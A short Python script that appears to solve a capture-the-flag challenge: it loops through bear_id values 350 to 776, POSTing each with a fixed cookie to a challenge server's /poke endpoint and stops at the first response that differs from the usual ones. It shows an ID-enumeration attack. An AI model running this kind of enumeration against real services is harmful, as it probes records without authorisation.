import requests

url = 'http://chals1.ais3.org:8987/poke'

for i in range(350, 777):
    response = requests.post(url, data={
        "bear_id": str(i)
    }, cookies={
        "Bear-Poker": "Bear-Poker"
    })
    print(i)
    print(response.text)
    if "nothing happened" not in response.text and "poke a cat" not in response.text:
        print(response.text)
        break
